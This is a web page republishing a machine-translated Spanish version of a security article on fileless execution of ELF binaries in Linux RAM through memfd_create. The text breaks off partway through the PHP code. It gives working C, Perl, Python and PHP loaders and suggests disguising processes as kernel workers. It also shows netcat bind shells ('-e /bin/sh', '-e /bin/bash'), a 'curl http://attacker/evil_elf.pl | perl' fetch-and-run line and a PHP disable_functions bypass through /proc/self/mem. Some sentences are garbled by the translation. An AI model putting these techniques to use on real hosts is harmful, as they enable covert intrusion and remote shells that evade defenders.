<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üßôüèΩ ‚ò∏Ô∏è üîû Elfos en la memoria. Ejecutando ELF en Linux RAM ü§™ üïç ‚úäüèº</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="La distribuci√≥n de malware sin archivos est√° ganando popularidad. Lo cual no es sorprendente, porque el trabajo de tales programas pr√°cticamente no de...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Elfos en la memoria. Ejecutando ELF en Linux RAM</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/fbk_cs/blog/430902/"><p><img src="https://habrastorage.org/webt/rg/xt/yd/rgxtyd3contgoitlza_ve1zah2g.jpeg"></p><br><p> La distribuci√≥n de malware sin archivos est√° ganando popularidad.  Lo cual no es sorprendente, porque el trabajo de tales programas pr√°cticamente no deja rastro.  En este art√≠culo no tocaremos la t√©cnica de ejecutar programas en la memoria de Windows.  Nos centramos en GNU / Linux.  Linux domina leg√≠timamente el segmento de servidores, vive en millones de dispositivos integrados y proporciona la gran mayor√≠a de los recursos web.  A continuaci√≥n, haremos una breve revisi√≥n de las posibilidades de ejecutar programas en la memoria y demostraremos que esto es posible incluso en condiciones dif√≠ciles. </p><a name="habracut"></a><br><p>  Las t√©cnicas de ejecuci√≥n sin archivos son secretas; es extremadamente dif√≠cil detectar y rastrear su uso.  Las herramientas de control de integridad del sistema de archivos no avisar√°n al administrador, ya que no se realizan operaciones de escritura en el disco o cambios en el archivo en el disco.  El software antivirus (a menudo descuidado por los usuarios de * nix) a menudo no supervisa la memoria del programa despu√©s del inicio.  Adem√°s, en muchas distribuciones de GNU / Linux, inmediatamente despu√©s de la instalaci√≥n, hay disponible una amplia gama de diversas utilidades de depuraci√≥n, int√©rpretes, compiladores de lenguajes de programaci√≥n y bibliotecas.  Todo esto crea excelentes condiciones para usar t√©cnicas de ejecuci√≥n encubierta de programas sin archivos.  Pero adem√°s de las ventajas de su uso, tambi√©n hay desventajas: estos programas no sobreviven al apag√≥n o al reinicio del host de destino.  Pero mientras el host se est√° ejecutando, el programa funciona. </p><br><p>  Dichas t√©cnicas pueden y deben usarse no solo para la distribuci√≥n de malware.  Si la velocidad de ejecuci√≥n de su programa es cr√≠tica para usted, desc√°rguela en la RAM.  En realidad, muchas distribuciones de Linux se sienten bien cuando se ejecutan por completo en RAM, lo que le permite trabajar con discos duros sin guardar ning√∫n archivo en ellos.  Desde el punto de vista de la auditor√≠a de seguridad de la informaci√≥n, los m√©todos de ejecuci√≥n encubierta de programas son muy √∫tiles como una etapa de post-operaci√≥n y reconocimiento dentro del per√≠metro de la red objetivo.  Especialmente si el secreto m√°ximo es una de las condiciones de auditor√≠a. <br>  Seg√∫n el portal <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">barkly.com</a> en 2018, ya el 35% de los ataques de virus ocurren en software malicioso que se ejecuta en la memoria. </p><br><p>  En el caso de Windows, los ciberdelincuentes utilizan activamente el sistema Powershell preinstalado para descargar y ejecutar el c√≥digo de inmediato.  Estas t√©cnicas son ampliamente utilizadas, entre otras cosas, gracias a su implementaci√≥n en marcos como Powershell Empire, Powersploit y Metasploit Framework. </p><br><h1 id="a-chto-naschet-linux">  ¬øQu√© hay de Linux? </h1><br><p>  En la mayor√≠a de los casos, las distribuciones de Linux instaladas en los hosts tienen un conjunto de software preinstalado.  Fuera de la caja, por regla general, hay int√©rpretes de lenguajes de programaci√≥n disponibles: compilador Python, Perl, C. PHP est√° presente en los sitios de alojamiento en el ap√©ndice.  Esta condici√≥n proporciona la capacidad de ejecutar c√≥digo usando estos lenguajes. </p><br><p>  En Linux, tenemos varias opciones bien conocidas para ejecutar c√≥digo en la memoria. <br>  La forma m√°s f√°cil es usar el √°rea de memoria compartida premontada en el sistema de archivos. </p><br><p>  Al colocar el archivo ejecutable en el directorio / dev / shm o / run / shm, es posible ejecutarlo directamente en la memoria, dado que estos directorios no son m√°s que una memoria de acceso aleatorio montada en el sistema de archivos.  Pero se pueden ver con ls como cualquier otro directorio.  Y como regla general, estos directorios se montan con el indicador noexec, y la ejecuci√≥n de programas en estos directorios solo est√° disponible para el superusuario.  Entonces, para ser un poco m√°s discreto, necesitas algo m√°s. </p><br><p> M√°s notable es la llamada al sistema <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">memfd_create (2)</a> .  Esta llamada al sistema funciona aproximadamente como <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">malloc (3)</a> , pero no devuelve un puntero a un √°rea de memoria, sino un descriptor de archivo a un archivo an√≥nimo, que es visible en el sistema de archivos solo como un enlace en <code>/proc/PID/fd/</code> , mediante el cual puede ejecutarse usando <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">execve (2).</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Esto</a> es lo que dice la p√°gina del manual para usar la <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">llamada al</a> sistema <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">memfd_create (en ruso)</a> : </p><br><p>  <em>"El nombre especificado en el</em> <code>name</code> <em>se usa como el nombre del archivo y se mostrar√° como el objetivo del enlace simb√≥lico correspondiente en el directorio. <code>/proc/self/fd/</code> . El nombre para mostrar siempre comienza con <code>memfd:</code> y es solo para depuraci√≥n. Los nombres no afectan el comportamiento del archivo "descriptor y, por lo tanto, varios archivos pueden tener el mismo nombre sin ninguna consecuencia".</em> </p><br><p>  Un ejemplo de uso de <code>memfd_create()</code> para el lenguaje C: </p><br><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/syscall.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/wait.h&gt; #include &lt;unistd.h&gt; int main() { int fd; pid_t child; char buf[BUFSIZ] = ""; ssize_t br; fd = syscall(SYS_memfd_create, "foofile", 0); if (fd == -1) { perror("memfd_create"); exit(EXIT_FAILURE); } child = fork(); if (child == 0) { dup2(fd, 1); close(fd); execlp("/bin/date", "/bin/date", NULL); perror("execlp date"); exit(EXIT_FAILURE); } else if (child == -1) { perror("fork"); exit(EXIT_FAILURE); } waitpid(child, NULL, 0); lseek(fd, 0, SEEK_SET); br = read(fd, buf, BUFSIZ); if (br == -1) { perror("read"); exit(EXIT_FAILURE); } buf[br] = 0; printf("child said: '%s'\n", buf); exit(EXIT_SUCCESS); }</span></span></span></span></code> </pre><br><p>  El c√≥digo anterior usa <code>memfd</code> , crea un proceso secundario, dirige su salida a un archivo temporal, espera a que se complete el proceso secundario y lee su salida del archivo temporal.  Por lo general, la canalizaci√≥n "|" se usa para redirigir la salida de un programa a la entrada de otro en * nix. </p><br><p>  La capacidad de usar <code>syscall()</code> tambi√©n est√° disponible en lenguajes interpretados como perl, python, etc. Luego, consideramos uno de los escenarios posibles y demostramos la capacidad de cargar archivos ejecutables en la memoria usando <code>memfd_create()</code> . </p><br><h3 id="perl">  Perl </h3><br><p>  Supongamos que tenemos un punto de entrada en forma de inyecci√≥n de comando. <br>  Necesitamos una forma de hacer llamadas al sistema en el sistema de destino. <br>  En perl, la funci√≥n <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">syscall ()</a> nos ayudar√° con esto. <br>  Tambi√©n necesitaremos una forma de escribir nuestro ELF directamente en la memoria como el contenido de un archivo an√≥nimo. <br>  Para hacer esto, colocaremos nuestro ELF directamente en el cuerpo del script, que a su vez se transferir√° al sistema de destino a trav√©s de la inyecci√≥n de comando disponible.  Alternativamente, tambi√©n puede descargar el archivo ejecutable a trav√©s de la red. <br>  Pero antes de eso vale la pena hacer una reserva.  Necesitamos conocer la versi√≥n del kernel de Linux en el host de destino, ya que la llamada al sistema <code>memfd_create()</code> requerida est√° disponible solo desde la versi√≥n <strong>3.17</strong> y superior. </p><br><p>  Echemos un <code>memfd_create()</code> m√°s de cerca a <code>memfd_create()</code> y <code>execve()</code> </p><br><p>  Para nuestro archivo an√≥nimo, utilizaremos la constante <code>MFD_CLOEXEC</code> , que "establece el indicador <code>close-on-exec (FD_CLOEXEC)</code> para un nuevo descriptor de archivo abierto".  Esto significa que nuestro descriptor de archivo se cerrar√° autom√°ticamente despu√©s de ejecutar nuestro ELF usando <code>execve()</code> </p><br><p>  Como usaremos la funci√≥n <code>syscall()</code> del lenguaje Perl, necesitaremos valores num√©ricos para llamar a nuestra llamada al <code>syscall</code> y su par√°metro. <br>  Puede encontrarlos en <code>/usr/include</code> o en Internet.  El n√∫mero de llamada del sistema se puede encontrar en <code>#define</code> comenzando con <code>__NR_</code> <br>  En nuestro caso, <code>memfd_create()</code> est√° numerado 319 para un sistema operativo de 64 bits.  Y la constante es <code>FD_CLOSEXEC 0x0001U</code> (es decir, 1 en el <code>linux/memfd.h</code> ) </p><br><p>  Ahora tenemos todos los valores num√©ricos necesarios, y podemos escribir en Perl un an√°logo de <code>memfd_create(name, MFD_CLOEXEC)</code> de C. <br>  Tambi√©n necesitaremos un nombre de archivo que se mostrar√° en <code>/memfd:</code> <br>  Ser√° √≥ptimo elegir un nombre similar a <code>[:kworker]</code> u otro, sin causar sospechas. <br>  Por ejemplo, pasaremos una cadena vac√≠a al par√°metro de nombre: </p><br><pre> <code class="perl hljs"><span class="hljs-keyword"><span class="hljs-keyword">my</span></span> $name = <span class="hljs-string"><span class="hljs-string">""</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">my</span></span> $fd = <span class="hljs-keyword"><span class="hljs-keyword">syscall</span></span>(<span class="hljs-number"><span class="hljs-number">319</span></span>, $name, <span class="hljs-number"><span class="hljs-number">1</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (-<span class="hljs-number"><span class="hljs-number">1</span></span> == $fd) { <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> <span class="hljs-string"><span class="hljs-string">"memfd_create: $!"</span></span>; }</code> </pre> <br><p>  Ahora tenemos el descriptor de archivo an√≥nimo en $ fd y necesitamos escribir el ELF en este archivo. <br>  La funci√≥n <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">open ()</a> en perl generalmente se usa para abrir archivos, pero usando la construcci√≥n <code>&gt;&amp;=FD</code> , pasando el descriptor a esta funci√≥n en lugar del nombre del archivo, convertimos el descriptor de archivo ya abierto en un controlador de archivo. <br>  <code>autoflush[]</code> tambi√©n nos ser√≠a √∫til: </p><br><pre> <code class="perl hljs"><span class="hljs-keyword"><span class="hljs-keyword">open</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">my</span></span> $FH, <span class="hljs-string"><span class="hljs-string">'&gt;&amp;='</span></span>.$fd) <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> <span class="hljs-string"><span class="hljs-string">"open: $!"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">select</span></span>((<span class="hljs-keyword"><span class="hljs-keyword">select</span></span>($FH), $|=<span class="hljs-number"><span class="hljs-number">1</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>]);</code> </pre> <br><p>  Ahora tenemos un identificador que se refiere a un archivo an√≥nimo. </p><br><p>  A continuaci√≥n, debemos convertir nuestro archivo ejecutable en datos que se puedan colocar en el cuerpo de un script Perl. <br>  Para hacer esto, realizamos: </p><br><pre> <code class="plaintext hljs">$ perl -e '$/=\32;print"print \$FH pack q/H*/, q/".(unpack"H*")."/\ or die qq/write: \$!/;\n"while(&lt;&gt;)' ./elfbinary</code> </pre> <br><p>  Tenemos muchas, muchas l√≠neas similares: </p><br><pre> <code class="perl hljs"><span class="hljs-keyword"><span class="hljs-keyword">print</span></span> $FH <span class="hljs-keyword"><span class="hljs-keyword">pack</span></span> <span class="hljs-keyword"><span class="hljs-keyword">q</span></span>/H*<span class="hljs-regexp"><span class="hljs-regexp">/, q/</span></span><span class="hljs-number"><span class="hljs-number">7</span></span>f454c4602010100000000000000000002003e0001000000304f45000000000<span class="hljs-number"><span class="hljs-number">0</span></span>/ <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> qq/<span class="hljs-keyword"><span class="hljs-keyword">write</span></span>: $!/; <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> $FH <span class="hljs-keyword"><span class="hljs-keyword">pack</span></span> <span class="hljs-keyword"><span class="hljs-keyword">q</span></span>/H*<span class="hljs-regexp"><span class="hljs-regexp">/, q/</span></span><span class="hljs-number"><span class="hljs-number">4000000000000000</span></span>c8010000000000000000000040003800070040001700030<span class="hljs-number"><span class="hljs-number">0</span></span>/ <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> qq/<span class="hljs-keyword"><span class="hljs-keyword">write</span></span>: $!/; <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> $FH <span class="hljs-keyword"><span class="hljs-keyword">pack</span></span> <span class="hljs-keyword"><span class="hljs-keyword">q</span></span>/H*<span class="hljs-regexp"><span class="hljs-regexp">/, q/</span></span><span class="hljs-number"><span class="hljs-number">0600000004000000400000000000000040004000000000004000400000000000</span></span>/ <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> qq/<span class="hljs-keyword"><span class="hljs-keyword">write</span></span>: $!/;</code> </pre> <br><p>  Habi√©ndolos ejecutado, guardaremos nuestro archivo ejecutable en la memoria.  Todo lo que nos queda es lanzarlo. </p><br><h4 id="fork">  tenedor () </h4><br><p>  Opcionalmente podemos usar <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">fork ()</a> .  Esto no es necesario en absoluto.  Pero si queremos no solo ejecutar ELF y matar el proceso, tendremos que usar <code>fork()</code> . <br>  En general, crear un proceso hijo en perl se parece a esto: </p><br><pre> <code class="perl hljs"><span class="hljs-keyword"><span class="hljs-keyword">while</span></span> ($keep_going) { <span class="hljs-keyword"><span class="hljs-keyword">my</span></span> $pid = <span class="hljs-keyword"><span class="hljs-keyword">fork</span></span>(); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (-<span class="hljs-number"><span class="hljs-number">1</span></span> == $pid) { <span class="hljs-comment"><span class="hljs-comment"># Error die "fork: $!"; } if (0 == $pid) { exit 0; } }</span></span></code> </pre> <br><p>  La utilidad de <code>fork()</code> tambi√©n <code>fork()</code> en el hecho de que al llamarlo junto con <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">setsid (2)</a> , puede separar el proceso hijo del proceso padre y dejar que el padre termine: </p><br><pre> <code class="perl hljs"><span class="hljs-comment"><span class="hljs-comment">#    my $pid = fork(); if (-1 == $pid) { # Error die "fork1: $!"; } if (0 != $pid) { #   exit 0; } #     if (-1 == syscall(112)) { die "setsid: $!"; } #    () $pid = fork(); if (-1 == $pid) { # Error die "fork2: $!"; } if (0 != $pid) { #    exit 0; } #   ""</span></span></code> </pre> <br><p>  Ahora podemos ejecutar ELF en muchos procesos. </p><br><h4 id="execve">  Execve () </h4><br><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Execve ()</a> es una llamada al sistema que nos permite ejecutar un programa.  Perl nos proporciona una funcionalidad similar a trav√©s de la funci√≥n <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Exec ()</a> , que funciona igual que la llamada al sistema mencionada anteriormente, pero tiene una sintaxis mucho m√°s simple y conveniente. <br>  Necesitamos pasar dos cosas a <code>exec()</code> : el archivo que queremos ejecutar (nuestra memoria ELF previamente cargada) y el nombre del proceso como uno de los argumentos pasados.  Por lo general, el nombre del proceso corresponde al nombre del archivo ejecutable.  Pero como veremos <code>/proc/PID/fd/3</code> en la lista de procesos, llamaremos a nuestro proceso otra cosa. <br>  La sintaxis para <code>exec()</code> siguiente: </p><br><pre> <code class="perl hljs"><span class="hljs-keyword"><span class="hljs-keyword">exec</span></span> {<span class="hljs-string"><span class="hljs-string">"/proc/$$/fd/$fd"</span></span>} <span class="hljs-string"><span class="hljs-string">"nc"</span></span>, <span class="hljs-string"><span class="hljs-string">"-kvl"</span></span>, <span class="hljs-string"><span class="hljs-string">"4444"</span></span>, <span class="hljs-string"><span class="hljs-string">"-e"</span></span>, <span class="hljs-string"><span class="hljs-string">"/bin/sh"</span></span> <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> <span class="hljs-string"><span class="hljs-string">"exec: $!"</span></span>;</code> </pre> <br><p>  El ejemplo anterior inicia Netcat.  Pero nos gustar√≠a lanzar algo un poco menos como una puerta trasera. <br>  El proceso en ejecuci√≥n no tendr√° un enlace al archivo an√≥nimo en <code>/proc/PID/fd</code> , pero siempre podemos encontrar nuestro ELF en el enlace <code>/proc/PID/exe</code> , que apunta al archivo del proceso en ejecuci√≥n. <br>  As√≠ que lanzamos ELF en la memoria de Linux, sin tocar el disco e incluso el sistema de archivos. <br>  Es posible descargar nuestro archivo ejecutable al sistema de destino de forma r√°pida y conveniente, por ejemplo, pasando un script al int√©rprete de Perl, en cuyo cuerpo colocamos ELF y lo colocamos en un alojamiento web externo: <code>$ curl http://attacker/evil_elf.pl | perl</code> <code>$ curl http://attacker/evil_elf.pl | perl</code> </p><br><h3 id="python">  Pit√≥n </h3><br><p>  Similar a la opci√≥n Perl, debemos hacer lo siguiente: </p><br><ul><li>  usando la llamada al sistema memfd_create (), cree un archivo an√≥nimo en la memoria </li><li>  escribe ELF ejecutable en este archivo </li><li>  ejecutarlo y opcionalmente ejecutarlo varias veces con fork () </li></ul><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> ctypes <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> os <span class="hljs-comment"><span class="hljs-comment">#   .     - binary = open('/tmp/rev-shell','rb').read() fd = ctypes.CDLL(None).syscall(319,"",1) #  memfd_create     final_fd = open('/proc/self/fd/'+str(fd),'wb') #    . final_fd.write(binary) final_fd.close() fork1 = os.fork() #   if 0 != fork1: os._exit(0) ctypes.CDLL(None).syscall(112) #  setsid()     . fork2 = os.fork() #     . if 0 != fork2: os._exit(0) os.execl('/proc/self/fd/'+str(fd),'argv0','argv1') #    .</span></span></code> </pre> <br><p>  En el caso de python, para llamar a <code>syscall</code> necesitamos el m√≥dulo est√°ndar <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">ctypes</a> y <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">os</a> para escribir y ejecutar el archivo y controlar el proceso.  Todo es completamente an√°logo a la versi√≥n perl. <br>  En el c√≥digo anterior, escribimos en el archivo un archivo ubicado previamente en el <code>/tmp/</code> .  Sin embargo, nada nos impide descargar el archivo del servidor web. </p><br><h3 id="php">  Php </h3><br><p>  En esta etapa, ya podemos usar perl y python.  Los int√©rpretes de estos idiomas se instalan de manera predeterminada en muchos sistemas operativos.  Pero lo m√°s interesante, como siempre, est√° por delante. <br>  Si, por alguna raz√≥n, los int√©rpretes de Perl o Python no est√°n disponibles para nosotros, ser√≠a genial usar PHP.  Este lenguaje es muy popular entre los desarrolladores web.  Y si ya encontramos la capacidad de ejecutar c√≥digo en una aplicaci√≥n web, es muy probable que el int√©rprete de PHP nos conozca. </p><br><p>  Desafortunadamente, php no tiene mecanismos incorporados para llamar a <code>syscall</code> . <br>  Nos encontramos con una <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">publicaci√≥n</a> de Beched'a en el foro rdot (¬°Gracias Beched!), Que sobrescribe la llamada de la funci√≥n <code>open</code> al <code>system</code> trav√©s de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">procfs</a> <code>/proc/self/mem</code> en la memoria del proceso actual y omite <code>disable_functions</code> . <br>  Utilizamos este truco para reescribir la funci√≥n en nuestro c√≥digo, lo que provocar√° las llamadas necesarias al sistema. <br>  Pasaremos syscall al int√©rprete php en forma de shellcode en el ensamblador. <br>  Las llamadas al sistema deber√°n pasarse a trav√©s de una secuencia de comandos. <br>  Comencemos a escribir un script PHP.  Lo siguiente ser√° mucha magia. </p><br><p>  Primero, denotamos los par√°metros necesarios: </p><br><pre> <code class="php hljs"> $elf = file_get_contents(<span class="hljs-string"><span class="hljs-string">"/bin/nc.traditional"</span></span>); <span class="hljs-comment"><span class="hljs-comment">// elf_payload $args = "test -lvvp 31338 -e /bin/bash"; // argv0 argv1 argv2 ...</span></span></code> </pre> <br><p>  Denote el cambio: los valores superior e inferior en la memoria, donde luego colocaremos nuestro shellcode: </p><br><pre> <code class="php hljs"> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">packlli</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($value)</span></span></span><span class="hljs-function"> </span></span>{ $higher = ($value &amp; <span class="hljs-number"><span class="hljs-number">0xffffffff00000000</span></span>) &gt;&gt; <span class="hljs-number"><span class="hljs-number">32</span></span>; $lower = $value &amp; <span class="hljs-number"><span class="hljs-number">0x00000000ffffffff</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> pack(<span class="hljs-string"><span class="hljs-string">'V2'</span></span>, $lower, $higher); }</code> </pre> <br><p>  Luego est√° la funci√≥n por la cual el archivo binario es "desempaquetado".  Para hacer esto, convertimos los datos binarios en una representaci√≥n decimal usando la funci√≥n <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">hexdex () de</a> los datos binarios <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">bin2hex ()</a> en el <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">orden inverso</a> (para almacenamiento): </p><br><pre> <code class="php hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">unp</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($value)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> hexdec(bin2hex(strrev($value))); }</code> </pre> <br><p>  A continuaci√≥n, el archivo <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">ELF</a> se analiza para obtener compensaciones: </p><br><pre> <code class="php hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">parseelf</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($bin_ver, $rela = false)</span></span></span><span class="hljs-function"> </span></span>{ $bin = file_get_contents($bin_ver); $e_shoff = unp(substr($bin, <span class="hljs-number"><span class="hljs-number">0x28</span></span>, <span class="hljs-number"><span class="hljs-number">8</span></span>)); $e_shentsize = unp(substr($bin, <span class="hljs-number"><span class="hljs-number">0x3a</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>)); $e_shnum = unp(substr($bin, <span class="hljs-number"><span class="hljs-number">0x3c</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>)); $e_shstrndx = unp(substr($bin, <span class="hljs-number"><span class="hljs-number">0x3e</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>($i = <span class="hljs-number"><span class="hljs-number">0</span></span>; $i &lt; $e_shnum; $i += <span class="hljs-number"><span class="hljs-number">1</span></span>) { $sh_type = unp(substr($bin, $e_shoff + $i * $e_shentsize + <span class="hljs-number"><span class="hljs-number">4</span></span>, <span class="hljs-number"><span class="hljs-number">4</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>($sh_type == <span class="hljs-number"><span class="hljs-number">11</span></span>) { <span class="hljs-comment"><span class="hljs-comment">// SHT_DYNSYM $dynsym_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8)); $dynsym_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8)); $dynsym_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8)); } elseif(!isset($strtab_off) &amp;&amp; $sh_type == 3) { // SHT_STRTAB $strtab_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8)); $strtab_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8)); } elseif($rela &amp;&amp; $sh_type == 4) { // SHT_RELA $relaplt_off = unp(substr($bin, $e_shoff + $i * $e_ + 24, 8)); $relaplt_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8)); $relaplt_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8)); } } if($rela) { for($i = $relaplt_off; $i &lt; $relaplt_off + $relaplt_size; $i += $relaplt_entsize) { $r_offset = unp(substr($bin, $i, 8)); $r_info = unp(substr($bin, $i + 8, 8)) &gt;&gt; 32; $name_off = unp(substr($bin, $dynsym_off + $r_info * $dynsym_entsize, 4)); $name = ''; $j = $strtab_off + $name_off - 1; while($bin[++$j] != "\0") { $name .= $bin[$j]; } if($name == 'open') { return $r_offset; } } } else { for($i = $dynsym_off; $i &lt; $dynsym_off + $dynsym_size; $i += $dynsym_entsize) { $name_off = unp(substr($bin, $i, 4)); $name = ''; $j = $strtab_off + $name_off - 1; while($bin[++$j] != "\0") { $name .= $bin[$j]; } if($name == '__libc_system') { $system_offset = unp(substr($bin, $i + 8, 8)); } if($name == '__open') { $open_offset = unp(substr($bin, $i + 8, 8)); } } return array($system_offset, $open_offset); }</span></span></code> </pre> <br><p>  Adem√°s, mostramos informaci√≥n sobre la versi√≥n instalada de PHP: </p><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!defined(<span class="hljs-string"><span class="hljs-string">'PHP_VERSION_ID'</span></span>)) { $version = explode(<span class="hljs-string"><span class="hljs-string">'.'</span></span>, PHP_VERSION); define(<span class="hljs-string"><span class="hljs-string">'PHP_VERSION_ID'</span></span>, ($version[<span class="hljs-number"><span class="hljs-number">0</span></span>] * <span 